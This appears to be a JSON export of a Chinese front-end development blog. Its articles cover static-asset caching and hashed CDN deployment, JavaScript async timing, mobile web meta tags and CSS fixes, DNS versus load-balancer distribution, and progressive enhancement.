什么东西与文件内容相关呢？我们会很自然的联想到利用 数据摘要要算法** 对文件求摘要信息，摘要信息与文件内容一一对应，就有了一种可以精确到单个文件粒度的缓存控制依据了。好了，我们把url改成带摘要信息的： 这回再有文件修改，就只更新那个文件对应的url了，想到这里貌似很完美了。你觉得这就够了么？大公司告诉你：图样图森破！ 现代互联网企业，为了进一步提升网站性能，会把静态资源和动态网页分集群部署，静态资源会被部署到CDN节点上，网页中引用的资源也会变成对应的部署路径： 好了，当我要更新静态资源的时候，同时也会更新html中的引用吧，就好像这样： 先部署页面，再部署资源：在二者部署的时间间隔内，如果有用户访问页面，就会在新的页面结构中加载旧的资源，并且把这个旧版本的资源当做新版本缓存起来，其结果就是：用户访问到了一个样式错乱的页面，除非手动刷新，否则在资源缓存过期之前，页面会一直执行错误。 先部署资源，再部署页面：在部署时间间隔之内，有旧版本资源本地缓存的用户访问网站，由于请求的页面是旧版本的，资源引用没有改变，浏览器将直接使用本地缓存，这种情况下页面展现正常；但没有本地缓存或者缓存过期的用户访问网站，就会出现旧版本页面加载新版本资源的情况，导致页面执行错误，但当页面完成部署，这部分用户再次访问页面又会恢复正常了。 好的，上面一坨分析想说的就是：先部署谁都不成！都会导致部署过程中发生页面错乱的问题。所以，访问量不大的项目，可以让研发同学苦逼一把，等到半夜偷偷上线，先上静态资源，再部署页面，看起来问题少一些。 但是，大公司超变态，没有这样的“绝对低峰期”，只有“相对低峰期”。So，为了稳定的服务，还得继续追求极致啊！ 这个奇葩问题，起源于资源的 覆盖式发布，用 待发布资源 覆盖 已发布资源，就有这种问题。解决它也好办，就是实现 非覆盖式发布。 看上图，用文件的摘要信息来对资源文件进行重命名，把摘要信息放到资源文件发布路径中，这样，内容有修改的资源就变成了一个新的文件发布到线上，不会覆盖已有的资源文件。上线过程中，先全量部署静态资源，再灰度部署页面，整个问题就比较完美的解决了。 所以，大公司的静态资源优化方案，基本上要实现这么几个东西： 配置超长时间的本地缓存 —— 节省带宽，提高性能 采用内容摘要作为缓存更新依据 —— 精确的缓存控制 静态资源CDN部署 —— 优化网络请求 更资源发布路径实现非覆盖式发布 —— 平滑升级 全套做下来，就是相对比较完整的静态资源缓存控制方案了，而且，还要注意的是，静态资源的缓存控制要求在前端所有静态资源加载的位置都要做这样的处理。是的，所有！什么js、css自不必说，还要包括js、css文件中引用的资源路径，由于涉及到摘要信息，引用资源的摘要信息也会引起引用文件本身的内容改变，从而形成级联的摘要变化，大概示意图就是： 好了，目前我们快速的学习了一下前端工程中关于静态资源缓存要面临的优化和部署问题，新的问题又来了：这™让工程师怎么写码啊！！！ 要解释优化与工程的结合处理思路，又会扯出一堆有关模块化开发、资源加载、请求合并、前端框架等等的工程问题，以上只是开了个头，解决方案才是精髓，但要说的太多太多，有空再慢慢展开吧。或者大家可以去我的blog看其中的一些拆解：fouber/blog · GitHub** 总之，前端性能优化绝逼是一个工程问题！ 以上不是我YY的，可以观察 百度 或者 facebook 的页面以及静态资源源代码，查看它们的资源引用路径处理，以及网络请中静态资源的缓存控制部分。再次赞叹facebook的前端工程建设水平，跪舔了。 建议前端工程师多多关注前端工程领域，也许有人会觉得自己的产品很小，不用这么变态，但很有可能说不定某天你就需要做出这样的改变了。而且，如果我们能把事情做得更极致，为什么不去做呢？ 另外，也不要觉得这些是运维或者后端工程师要解决的问题。如果由其他角色来解决，大家总是把自己不关心的问题丢给别人，那么前端工程师的开发过程将受到极大的限制，这种情况甚至在某些大公司都不少见！ 转载自知乎 https://www.zhihu.com/question/20790576 参考链接 https://github.com/fouber/blog","comments":true,"tags":[{"name":"杂文","slug":"杂文","permalink":"http://www.wanyifeng.top/tags/杂文/"}]},{"title":"js异步特性","date":"2017-02-18T01:13:21.000Z","path":"2017/02/18/js异步特性/","text":"JavaScript的优势之一是其如何处理异步代码。异步代码会被放入一个事件队列，等到所有其他代码执行后才进行，而不会阻塞线程。然而，对于初学者来说，书写异步代码可能会比较困难。而在这篇文章里，我将会消除你可能会有的任何困惑。理解异步代码 JavaScript最基础的异步函数是setTimeout和setInterval。setTimeout会在一定时间后执行给定的函数。它接受一个回调函数作为第一参数和一个毫秒时间作为第二参数。以下是用法举例： 1234567891011(function ()&#123; console.log(1) setTimeout(function ()&#123; console.log(2) &#125;,1000) setTimeout(function ()&#123; console.log(3) &#125;,200) console.log(4)&#125;)() // =&gt; 1432 正如预期，控制台先输出14大约200毫秒后，再看到3 最后看到4 我用“大约”是因为setTimeout事实上是不可预知的。实际上，甚至 HTML5规范都提到了这个问题： 这个API不能保证计时会如期准确地运行。由于CPU负载、其他任务等所导致的延迟是可以预料到的。” 直到在同一程序段中所有其余的代码执行结束后，超时才会发生。所以如果设置了超时，同时执行了需长时间运行的函数，那么在该函数执行完成之前，超时甚至都不会启动。实际上，异步函数，如setTimeout和setInterval，被压入了称之为Event Loop的队列。 Event Loop是一个回调函数队列。当异步函数执行时，回调函数会被压入这个队列。JavaScript引擎直到异步函数执行完成后，才会开始处理事件循环。这意味着JavaScript代码不是多线程的，即使表现的行为相似。事件循环是一个先进先出（FIFO）队列，这说明回调是按照它们被加入队列的顺序执行的 1234567(function ()&#123; console.log(1) setTimeout(console.log(2),1000) setTimeout(console.log(3),200) console.log(4)&#125;)() // =&gt; 1234 但是之所有JavaScript有异步特性 是JavaScript单线程会存在IO阻塞问题 所有代码都是一步一步按顺序执行 实质上JavaScript的异步特性就是模拟其他面向对象语言的多线程","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"移动端web开发常见问题","date":"2017-02-12T03:33:21.000Z","path":"2017/02/12/移动端常见问题总结 /","text":"1. 添加到主屏后的标题（IOS）1&lt;meta name=\"apple-mobile-web-app-title\"content=\"标题\"&gt; 2. 启用 WebApp 全屏模式（IOS）当网站添加到主屏幕后再点击进行启动时，可隐藏地址栏（从浏览器跳转或输入链接进入并没有此效果） 123&lt;meta name=\"apple-mobile-web-app-capable\"content=\"yes\" /&gt; &lt;meta name=\"apple-touch-fullscreen\"content=\"yes\" /&gt; 3. 百度禁止转码通过百度手机打开网页时，百度可能会对你的网页进行转码，往你页面贴上它的广告，非常之恶心。不过我们可以通过这个meta标签来禁止它： 1&lt;meta http-equiv=\"Cache-Control\"content=\"no-siteapp\" /&gt; 百度SiteApp转码声明：http://t.cn/R28wSBl 4. 设置状态栏的背景颜色（IOS）设置状态栏的背景颜色，只有在”apple-mobile-web-app-capable”content=”yes”时生效 1&lt;metaname=\"apple-mobile-web-app-status-bar-style\"content=\"black-translucent\" /&gt; content 参数： default ：状态栏背景是白色。 black ：状态栏背景是黑色。 black-translucent​ ：状态栏背景是半透明。 如果设置为 default 或 black ,网页内容从状态栏底部开始。​ 如果设置为 black-translucent ,网页内容充满整个屏幕，顶部会被状态栏遮挡。 5.移动端手机号码识别（IOS）在iOS Safari （其他浏览器和Android均不会）上会对那些看起来像是电话号码的数字处理为电话链接，比如： 7位数字，形如：1234567 带括号及加号的数字，形如：(+86)123456789 双连接线的数字，形如：00-00-00111 11位数字，形如：13800138000 可能还有其他类型的数字也会被识别。我们可以通过如下的meta来关闭电话号码的自动识别： 1&lt;meta name=\"format-detection\"content=\"telephone=no\" /&gt; 开启电话功能 123456 开启短信功能： 123456 6. 移动端邮箱识别（Android）与电话号码的识别一样，在安卓上会对符合邮箱格式的字符串进行识别，我们可以通过如下的meta来管别邮箱的自动识别： 1&lt;meta content=\"email=no\"name=\"format-detection\" /&gt; 同样地，我们也可以通过标签属性来开启长按邮箱地址弹出邮件发送的功能： 1amailto:dooyoe@gmail.com\"dooyoe@gmail.com&lt;/a&gt; 7. 添加智能 App 广告条 Smart App Banner（IOS 6+ Safari）1&lt;meta name=\"apple-itunes-app\"content=\"app-id=myAppStoreID, affiliate-data=myAffiliateData,app-argument=myURL\"&gt; 8. IOS Web app启动动画由于iPad 的启动画面是不包括状态栏区域的。所以启动图片需要减去状态栏区域所对应的方向上的20px大小，相应地在retina设备上要减去40px的大小。 12345678910111213&lt;linkhref=\"apple-touch-startup-image-320x460.png\"media=\"(device-width: 320px)\"rel=\"apple-touch-startup-image\"&gt;&lt;linkhref=\"apple-touch-startup-image-640x960.png\"media=\"(device-width: 320px) and (-webkit-device-pixel-ratio: 2)\"rel=\"apple-touch-startup-image\"&gt;&lt;link href=\"apple-touch-startup-image-768x1004.png\"media=\"(device-width: 768px) and (orientation: portrait)\"rel=\"apple-touch-startup-image\"&gt;&lt;linkhref=\"apple-touch-startup-image-748x1024.png\"media=\"(device-width: 768px) and (orientation: landscape)\"rel=\"apple-touch-startup-image\"&gt;&lt;link href=\"apple-touch-startup-image-1536x2008.png\"media=\"(device-width: 1536px) and (orientation: portrait) and(-webkit-device-pixel-ratio: 2)\"rel=\"apple-touch-startup-image\"&gt;&lt;linkhref=\"apple-touch-startup-image-2048x1496.png\"media=\"(device-width: 1536px) and(orientation: landscape) and (-webkit-device-pixel-ratio: 2)\"rel=\"apple-touch-startup-image\"&gt;（landscape：横屏 | portrait：竖屏） 9. 添加到主屏后的APP图标指定web app添加到主屏后的图标路径，有两种略微不同的方式： 1234567&lt;!-- 设计原图 --&gt;&lt;link href=\"short_cut_114x114.png\" rel=\"apple-touch-icon-precomposed\"&gt;&lt;!-- 添加高光效果 --&gt;&lt;link href=\"short_cut_114x114.png\"rel=\"apple-touch-icon\"&gt; apple-touch-icon：在IOS6及以下的版本会自动为图标添加一层高光效果（IOS7开始已使用扁平化的设计风格） apple-touch-icon-precomposed：使用“设计原图图标” 效果： ​ 图标尺寸： 可通过指定size属性来为不同的设备提供不同的图标（但通常来说，我们只需提供一个114 x 114pixels大小的图标即可 ） 官方说明如下： Create different sizes of your app icon for differentdevices. If you’re creating a universal app, you need to supply app icons in all four sizes. For iPhone and iPod touch both of these sizes arerequired: 57 x 57 pixels 114 x 114 pixels (high resolution) For iPad, both of these sizes are required: 72 x 72 pixels 144 x 144 (high resolution) 10. 优先使用最新版本 IE 和 Chrome1&lt;meta http-equiv=\"X-UA-Compatible\"content=\"IE=edge,chrome=1\" /&gt; 11.viewport模板1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;metacontent=\"width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no\"name=\"viewport\"&gt;&lt;meta content=\"yes\"name=\"apple-mobile-web-app-capable\"&gt;&lt;meta content=\"black\"name=\"apple-mobile-web-app-status-bar-style\"&gt;&lt;meta content=\"telephone=no\"name=\"format-detection\"&gt;&lt;meta content=\"email=no\"name=\"format-detection\"&gt;&lt;title&gt;标题&lt;/title&gt;&lt;link rel=\"stylesheet\"href=\"index.css\"&gt;&lt;/head&gt;&lt;body&gt;这里开始内容&lt;/body&gt;&lt;/html&gt; 常见问题1、移动端如何定义字体font-family三大手机系统的字体： iOS **系统** 默认中文字体是Heiti SC 默认英文字体是Helvetica 默认数字字体是HelveticaNeue 无微软雅黑字体 Android **系统** 默认中文字体是Droidsansfallback 默认英文和数字字体是Droid Sans 无微软雅黑字体 Winphone **系统** 默认中文字体是Dengxian(方正等线体) 默认英文和数字字体是Segoe 无微软雅黑字体 各个手机系统有自己的默认字体，且都不支持微软雅黑，如无特殊需求，手机端无需定义中文字体，使用系统默认英文字体和数字字体可使用 Helvetica ，三种系统都支持。 * 移动端定义字体的代码 */ body{font-family:Helvetica;} 2、移动端字体单位font-size选择px还是rem 对于只需要适配手机设备，使用px即可 对于需要适配各种移动设备，使用rem，例如只需要适配iPhone和iPad等分辨率差别比较挺大的设备 rem配置参考： 12345678910111213141516171819202122232425262728293031323334353637383940414243html &#123;font-size:10px&#125;@media screen and (min-width:480px) and (max-width:639px)&#123; html &#123; font-size:15px &#125;&#125;@media screen and (min-width:640px) and (max-width:719px)&#123; html &#123; font-size:20px &#125;&#125;@media screen and (min-width:720px) and (max-width:749px)&#123; html &#123; font-size:22.5px &#125;&#125;@media screen and (min-width:750px) and (max-width:799px)&#123; html &#123; font-size:23.5px &#125;&#125;@media screen and (min-width:800px) and (max-width:959px)&#123; html &#123; font-size:25px &#125;&#125;@media screen and (min-width:960px) and(max-width:1079px) &#123; html &#123; font-size:30px &#125;&#125;@media screen and (min-width:1080px) &#123; html &#123; font-size:32px &#125;&#125; 3、移动端touch事件(区分webkit 和 winphone)当用户手指放在移动设备在屏幕上滑动会触发的touch事件 以下支持webkit touchstart——当手指触碰屏幕时候发生。不管当前有多少只手指 touchmove——当手指在屏幕上滑动时连续触发。通常我们再滑屏页面，会调用event的preventDefault()可以阻止默认情况的发生：阻止页面滚动 touchend——当手指离开屏幕时触发 touchcancel——系统停止跟踪触摸时候会触发。例如在触摸过程中突然页面alert()一个提示框，此时会触发该事件，这个事件比较少用 以下支持winphone 8 MSPointerDown——当手指触碰屏幕时候发生。不管当前有多少只手指 MSPointerMove——当手指在屏幕上滑动时连续触发。通常我们再滑屏页面，会调用css的html{-ms-touch-action:​ none;}可以阻止默认情况的发生：阻止页面滚动 MSPointerUp——当手指离开屏幕时触发 4、移动端click屏幕产生200-300 ms的延迟响应移动设备上的web网页是有300ms延迟的，玩玩会造成按钮点击延迟甚至是点击失效。 以下是历史原因： 2007年苹果发布首款iphone上IOS系统搭载的safari为了将适用于PC端上大屏幕的网页能比较好的展示在手机端上，使用了双击缩放 (double tap to zoom)的方案，比如你在手机上用浏览器打开一个PC上的网页，你可能在看到页面内容虽然可以撑满整个屏幕，但是字体、图片都很小看不清，此时可以快速双击屏幕上的某一部分，你就能看清该部分放大后的内容，再次双击后能回到原始状态。 双击缩放是指用手指在屏幕上快速点击两次，iOS 自带的 Safari 浏览器会将网页缩放至原始比例。 原因就出在浏览器需要如何判断快速点击上，当用户在屏幕上单击某一个元素时候，例如跳转链接，此处浏览器会先捕获该次单击，但浏览器不能决定用户是单纯要点击链接还是要双击该部分区域进行缩放操作，所以，捕获第一次单击后，浏览器会先Hold一段时间t，如果在t时间区间里用户未进行下一次点击，则 浏览器会做单击跳转链接的处理，如果t时间里用户进行了第二次单击操作，则浏览器会禁止跳转，转而进行对该部分区域页面的缩放操作。那么这个时间区间t有 多少呢？在IOS safari下，大概为300毫秒。这就是延迟的由来。造成的后果用户纯粹单击页面，页面需要过一段时间才响应，给用户慢体验感觉，对于web开发者来说 是，页面js捕获click事件的回调函数处理，需要300ms后才生效，也就间接导致影响其他业务逻辑的处理。 解决方案： fastclick可以解决在手机上点击事件的300ms延迟 zepto的touch模块，tap事件也是为了解决在click的延迟问题 触摸事件的响应顺序 1、ontouchstart 2、ontouchmove 3、ontouchend 4、onclick 解决300ms延迟的问题，也可以通过绑定ontouchstart事件，加快对事件的响应。 5、什么是Retina 显示屏，带来了什么问题retina：一种具备超高像素密度的液晶屏，同样大小的屏幕上显示的像素点由1个变为多个，如在同样带下的屏幕上，苹果设备的retina显示屏中，像素点1个变为4个 在高清显示屏中的位图被放大，图片会变得模糊，因此移动端的视觉稿通常会设计为传统PC的2倍。 那么，前端的应对方案是： 设计稿切出来的图片长宽保证为偶数，并使用backgroud-size把图片缩小为原来的1/2 //例如图片宽高为：200px*200px，那么写法如下 .css{width:100px;height:100px;background-size:100px100px;} 其它元素的取值为原来的1/2，例如视觉稿40px的字体，使用样式的写法为20px .css{font-size:20px} 6、ios系统中元素被触摸时产生的半透明灰色遮罩怎么去掉ios用户点击一个链接，会出现一个半透明灰色遮罩, 如果想要禁用，可设置-webkit-tap-highlight-color的alpha值为0，也就是属性值的最后一位设置为0就可以去除半透明灰色遮罩。 a,button,input,textarea{-webkit-tap-highlight-color:rgba(0,0,0,0;)} 7、部分android系统中元素被点击时产生的边框怎么去掉android用户点击一个链接，会出现一个边框或者半透明灰色遮罩, 不同生产商定义出来额效果不一样，可设置-webkit-tap-highlight-color的alpha值为0去除部分机器自带的效果。 1234a,button,input,textarea&#123; -webkit-tap-highlight-color: rgba(0,0,0,0;) -webkit-user-modify:read-write-plaintext-only; &#125; -webkit-user-modify有个副作用，就是输入法不再能够输入多个字符。 另外，有些机型去除不了，如小米2 对于按钮类还有个办法，不使用a或者input标签，直接用div标签 8、winphone系统a、input标签被点击时产生的半透明灰色背景怎么去掉1&lt;meta name=\"msapplication-tap-highlight\"content=\"no\"&gt; 9、webkit表单元素的默认外观怎么重置.css{-webkit-appearance:none;} 10、webkit表单输入框placeholder的颜色值能改变么input::-webkit-input-placeholder{color:#AAAAAA;} input:focus::-webkit-input-placeholder{color:#E 11、webkit表单输入框placeholder的文字能换行么iOS可以，Android不行~ 关闭iOS键盘首字母自动大写 在iOS中，默认情况下键盘是开启首字母大写的功能的，如果启用这个功能，可以这样： 1&lt;input type=\"text\"autocapitalize=\"off\" /&gt; 12. 关闭iOS输入自动修正和英文输入默认自动首字母大写那样，IOS还做了一个功能，默认输入法会开启自动修正输入内容，这样的话，用户经常要操作两次。如果不希望开启此功能，我们可以通过input标签属性来关闭掉： 1&lt;input type=\"text\"autocorrect=\"off\" /&gt; 13. 禁止文本缩放当移动设备横竖屏切换时，文本的大小会重新计算，进行相应的缩放，当我们不需要这种情况时，可以选择禁止： 123html &#123; -webkit-text-size-adjust: 100%;&#125; 需要注意的是，PC端的该属性已经被移除，该属性在移动端要生效，必须设置 meta viewport。 14. 移动端如何清除输入框内阴影在iOS上，输入框默认有内部阴影，但无法使用box-shadow 来清除，如果不需要阴影，可以这样关闭： 12345input,textarea &#123; border: 0; /* 方法1 */ -webkit-appearance: none; /* 方法2*/&#125; 15. 快速回弹滚动我们先来看看回弹滚动在手机浏览器发展的历史： 早期的时候，移动端的浏览器都不支持非body元素的滚动条，所以一般都借助 iScroll; Android 3.0/iOS解决了非body元素的滚动问题，但滚动条不可见，同时iOS上只能通过2个手指进行滚动； Android 4.0解决了滚动条不可见及增加了快速回弹滚动效果，不过随后这个特性又被移除； iOS从5.0开始解决了滚动条不可见及增加了快速回弹滚动效果 在iOS上如果你想让一个元素拥有像 Native 的滚动效果，你可以这样做： 1234.xxx &#123; overflow:auto; /* auto | scroll */ -webkit-overflow-scrolling: touch; &#125; PS：iScroll用过之后感觉不是很好，有一些诡异的bug，这里推荐另外一个 iDangero Swiper，这个插件集成了滑屏滚动的强大功能（支持3D），而且还有回弹滚动的内置滚动条。iDangero官方地址： :www.idangero.us/swiper/#.VX_t9PmEB8Y 16. 移动端禁止选中内容如果你不想用户可以选中页面中的内容，那么你可以在css中禁掉： 12345.user-select-none &#123; -webkit-user-select: none; /*Chrome all / Safari all */ -moz-user-select:none; /* Firefox all （移动端不需要） */ -ms-user-select:none; /* IE 10+ */ &#125; 17. 移动端取消touch高亮效果在做移动端页面时，会发现所有a标签在触发点击时或者所有设置了伪类 :active 的元素，默认都会在激活状态时，显示高亮框，如果不想要这个高亮，那么你可以通过css以下方法来进行全局的禁止： 123html &#123; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);&#125; 但这个方法在三星的机子上无效，有一种妥协的方法是把页面非真实跳转链接的a标签换成其它标签，可以解决这个问题。 18. 如何禁止保存或拷贝图像（IOS）通常当你在手机或者pad上长按图像 img ，会弹出选项存储图像 或者拷贝图像，如果你不想让用户这么操作，那么你可以通过以下方法来禁止： 1img &#123; -webkit-touch-callout: none; &#125; 19.模拟按钮hover效果移动端触摸按钮的效果，可明示用户有些事情正要发生，是一个比较好体验，但是移动设备中并没有鼠标指针，使用css的hover并不能满足我们的需求，还好国外有个激活css的active效果，代码如下， 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;metacontent=\"width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no\"name=\"viewport\"&gt;&lt;meta content=\"yes\"name=\"apple-mobile-web-app-capable\"&gt;&lt;meta content=\"black\"name=\"apple-mobile-web-app-status-bar-style\"&gt;&lt;meta content=\"telephone=no\"name=\"format-detection\"&gt;&lt;meta content=\"email=no\"name=\"format-detection\"&gt;&lt;style type=\"text/css\"&gt;a&#123;-webkit-tap-highlight-color: rgba(0,0,0,0);&#125;.btn-blue&#123;display:block;height:42px;line-height:42px;text-align:center;border-radius:4px;font-size:18px;color:#FFFFFF;background-color:#4185F3;&#125;.btn-blue:active&#123;background-color: #357AE8;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"btn-blue\"&gt;按钮&lt;/div&gt; &lt;script type=\"text/javascript\"&gt;document.addEventListener(\"touchstart\",function()&#123;&#125;, true)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;兼容性ios5+、部分android 4+、winphone8要做到全兼容的办法，可通过绑定ontouchstart和ontouchend来控制按钮的类名。&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;metacontent=\"width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no\"name=\"viewport\"&gt;&lt;meta content=\"yes\"name=\"apple-mobile-web-app-capable\"&gt;&lt;meta content=\"black\"name=\"apple-mobile-web-app-status-bar-style\"&gt;&lt;meta content=\"telephone=no\"name=\"format-detection\"&gt;&lt;meta content=\"email=no\"name=\"format-detection\"&gt;&lt;style type=\"text/css\"&gt;a&#123;-webkit-tap-highlight-color: rgba(0,0,0,0);&#125;.btn-blue&#123;display:block;height:42px;line-height:42px;text-align:center;border-radius:4px;font-size:18px;color:#FFFFFF;background-color:#4185F3;&#125;.btn-blue-on&#123;background-color: #357AE8;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=\"btn-blue\"&gt;按钮&lt;/div&gt;&lt;script type=\"text/javascript\"&gt;var btnBlue =document.querySelector(\".btn-blue\");btnBlue.ontouchstart = function()&#123; this.className= \"btn-blue btn-blue-on\"&#125;btnBlue.ontouchend = function()&#123; this.className= \"btn-blue\"&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 20.屏幕旋转的事件和样式事件 window.orientation，取值：正负90表示横屏模式、0和180表现为竖屏模式； 1234567891011window.onorientationchange = function()&#123; switch(window.orientation)&#123; case -90: case 90: alert(\"横屏:\" + window.orientation); case 0: case 180: alert(\"竖屏:\" +window.orientation); break; &#125;&#125; 样式 12345678//竖屏时使用的样式@media all and (orientation:portrait) &#123; .css&#123;&#125;&#125; //横屏时使用的样式@media all and (orientation:landscape) &#123; .css&#123;&#125;&#125; 21.audio元素和video元素在ios和andriod中无法自动播放应对方案：触屏即播 123$('html').one('touchstart',function()&#123; audio.play()&#125;) 22.摇一摇功能HTML5 deviceMotion：封装了运动传感器数据的事件，可以获取手机运动状态下的运动加速度等数据。 23.手机拍照和上传图片123456789&lt;input type=\"file\"&gt;的accept 属性&lt;!-- 选择照片 --&gt;&lt;input type=file accept=\"image/*\"&gt;&lt;!-- 选择视频 --&gt;&lt;input type=file accept=\"video/*\"&gt; 使用总结： iOS有拍照、录像、选取本地图片功能 部分android只有选取本地图片功能 winphone不支持 input控件默认外观丑陋 24.消除transition闪屏123456.css&#123; /设置内嵌的元素在 3D 空间如何呈现：保留 3D/ -webkit-transform-style: preserve-3d; /（设置进行转换的元素的背面在面对用户时是否可见：隐藏）/ -webkit-backface-visibility: hidden;&#125; 开启硬件加速 解决页面闪白 保证动画流畅 123456 .css &#123; -webkit-transform: translate3d(0, 0, 0); -moz-transform: translate3d(0, 0, 0); -ms-transform:translate3d(0, 0, 0); transform:translate3d(0, 0, 0); &#125; 设计高性能CSS3动画的几个要素 尽可能地使用合成属性transform和opacity来设计CSS3动画 不使用position的left和top来定位 利用translate3D开启GPU加速 25. android 上去掉语音输入按钮1input::-webkit-input-speech-button &#123;display: none&#125; 框架1. 移动端基础框架 zepto.js语法与jquery几乎一样，会jquery基本会zepto； iscroll.js解决页面不支持弹性滚动，不支持fixed引起的问题~ 实现下拉刷新，滑屏，缩放等功能； underscore.js该库提供了一整套函数式编程的实用功能，但是没有扩展任何JavaScript内置对象； fastclick加快移动端点击响应时间 animate.css CSS3动画效果库 2.滑屏框架适合上下滑屏、左右滑屏等滑屏切换页面的效果 slip.js iSlider.js fullpage.js 3.瀑布流框架 masonry 工具推荐 caniuse 各浏览器支持html5属性查询 paletton 调色搭配 https://www.awesomes.cn/ 当流行的前端框架和插件 http://www.swiper.com.cn/api/index.html 移动端常见的滑动效果","comments":true,"tags":[{"name":"移动端","slug":"移动端","permalink":"http://www.wanyifeng.top/tags/移动端/"}]},{"title":"负载均衡解决方案","date":"2017-02-11T02:13:21.000Z","path":"2017/02/11/负载均衡解决方案/","text":"DNS 轮询 DNS本身的机制不再赘述，这里主要看一看基于DNS的负载均衡，其大致原理很清楚，DNS系统本身支持同一个域名映射到多个ip (A记录）,例如 niubility.com. IN A 172.168.1.101 IN A 172.168.1.102 IN A 172.168.1.103 IN A 172.168.1.104 这样每次向DNS系统询问该域名的ip地址时（Tell Me The IP Address of niubility.com.），DNS会轮询(Round Robin)这个ip列表，每次给一个不同的ip，从而达到负载均衡的效果。 来看看这种负载均衡解决方案的优缺点 优点 易于实现 对于应用系统本身几乎没有任何侵入，配置也很简单，在某个文本里多加几行A记录就可以。尤其对于一个基于Web的系统来说更是如此，用户在浏览器里输入的URL host部分天然就是域名，所以在某个环节你必然有起码一台DNS服务器记录着这个域名对应的ip，所以可以说是基于已有域名系统(资产)就做到了负载均衡。 缺点 会话粘连 (Session Sticky) 客户端与目标系统之间一般存在会话的概念（不止是web系统的http session）, 其本质在于server端会或多或少的存一些客户端整个会话期间交互的身份识别以及数据信息，为了防止server端每次都对同一个客户端问一下，你是谁？系统会希望客户端在一个会话期间粘连在某个特定的serer上，除非这个server失败才failover到其它的server上，这种粘连特性对于server处理客户端请求处理的性能和客户端看到的数据一致性是有很大好处的。但是DNS负载均衡不能保证下一次请求会再次落在同一个server上。 DNS解析缓存和TTL带来的麻烦 dns记录的缓存以及缓存失效时间都是个问题，在无线时代，通常来自手机的访问会经过称为行业网关的代理服务器，由于代理服务器会将域名解析的结果缓存一段时间，所以所有经由这个代理服务器的访问请求就全被解析到同一台服务器上去了，因此就可能无法实现均等分配需要处理的请求了。另外在后端集群的拓扑结构(副本数、部署位置、健康状态等)发生变化之后，dns配置的变化要等到网络上所有节点的缓存失效才能反馈出来，这带来的问题起码有2个，1是在等待失效过程中，完全不可控，没有办法加快这个进程，中美切换要花10分钟，因为要等网络所有几点对某些域名的TTL失效，2是滞后，有时候这种滞后是致命的，比如仍然有部分流量打到已经挂掉的那部分服务器上。 容错 一个大型数据中心，每天都有机器坏了是很正常的事情，尤其是在虚拟化大行其道的今天，更是如此，相信你对虚拟主机又崩溃了一个，或者总是被同宿主机的猪一样的队友“挤”死这种情况一定不陌生。dns负载均衡的一大问题就在于这种情况下的容灾很麻烦，一是需要人工干预或者其他软件配合做健康监测，从dns配置中将无响应的机器或者崩溃的机器的相应的A记录删掉。一是删掉之后也要等到所有网络节点上的dns解析缓存失效，在这端时间内，很多访问系统的客户会受到影响。 数据热点 dns是在域名层面做负载均衡，如果从web系统的请求URL角度讲，不同的URL对后端server的压力强度不一样，dns负载很可能会出现所有高强度的请求全都被打到小部分服务器甚至同一台上去了的情况，这个问题的可怕性不在于风险，而在于风险完全不可控。 方案2 引入负载均衡器 客户端 -&gt; LB -&gt; replica1,replica2,replica3 ​ LB负责客户端流量到后端服务集群的分发，一般LB也会负责后端所有server的健康监测 优点 可以在LB里面做集中的分发逻辑，可以有多种分发方式，例如最常见的Round Robin, Random Robin, Weight-Based Round Robin等。 缺点 LB是单点, 摘抄至 http://mt.sohu.com/20160607/n453396368.shtml","comments":true,"tags":[{"name":"服务器","slug":"服务器","permalink":"http://www.wanyifeng.top/tags/服务器/"}]},{"title":"优雅降级和渐进增强","date":"2017-02-10T10:43:21.000Z","path":"2017/02/10/优雅降级和渐进增强/","text":"css3属性的兼容性的写法顺序不太一样，比如transition属性，有些把transition放在前面有些是放在后面，比如下面这两种： 123456.transition&#123; -webkit-transition: all .2s; -moz-transition: all .2s; -o-transition: all .2s; transition: all .2s; &#125; 123456.transition&#123; transition: all .2s; -o-transition: all .2s; -moz-transition: all .2s; -webkit-transition: all .2s;&#125; 带前缀的排列应该只是为了整齐吧（还是代表了对浏览器的喜好程度）？但是transition放在前面还是后面却引申了两个概念：优雅降级和渐进增强。 优雅降级和渐进增强印象中是随着css3流出来的一个概念。由于低级浏览器不支持css3，但css3的效果又太优秀–不忍放弃，所以在高级浏览中使用css3而低级浏览器只保证最基本的功能。咋一看两个概念差不多，都是在关注不同浏览器下的不同体验，关键的区别是他们所侧重的内容，以及这种不同造成的工作流程的差异。 什么是渐进增强、优雅降级? 渐进增强：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。 优雅降级 ：一开始就构建完整的功能，然后再针对低版本浏览器进行兼容。 区别：优雅降级是从复杂的现状开始，并试图减少用户体验的供给，而渐进增强则是从一个非常基础的，能够起作用的版本开始，并不断扩充，以适应未来环境的需要。降级（功能衰减）意味着往回看；而渐进增强则意味着朝前看，同时保证其根基处于安全地带。 优雅降级”观点“优雅降级”观点认为应该针对那些最高级、最完善的浏览器来设计网站。而将那些被认为“过时”或有功能缺失的浏览器下的测试工作安排在开发周期的最后阶段，并把测试对象限定为主流浏览器（如 IE、Mozilla 等）的前一个版本。 在这种设计范例下，旧版的浏览器被认为仅能提供“简陋却无妨的浏览体验。你可以做一些小的调整来适应某个特定的浏览器。但由于它们并非我们所关注的焦点，因此除了修复较大的错误之外，其它的差异将被直接忽略。 渐进增强”观点“渐进增强”观点则认为应关注于内容本身。 内容是我们建立网站的诱因。有的网站展示它，有的则收集它，有的寻求，有的操作，还有的网站甚至会包含以上的种种，但相同点是它们全都涉及到内容。这使得“渐进增强”成为一种更为合理的设计范例。这也是它立即被 Yahoo! 